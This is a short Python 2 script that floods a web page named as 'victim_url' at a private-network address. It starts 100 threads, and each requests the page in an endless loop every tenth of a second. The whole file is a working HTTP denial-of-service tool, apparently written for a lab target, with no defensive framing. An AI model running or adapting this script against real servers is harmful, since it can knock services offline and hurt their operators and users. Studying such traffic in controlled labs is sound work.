#!/usr/bin/env python

import sys, time, threading, urllib2
victim_url = "http://192.168.100.222/index.php"

def worker():
    while 1:
        res = urllib2.urlopen(victim_url)
        res.close()
        time.sleep(0.1)
if __name__=='__main__':
    thread_pool=[]
    TNUM = 100
    for i in range(TNUM):
        th=threading.Thread(target=worker)
        thread_pool.append(th)
        thread_pool[i].start()
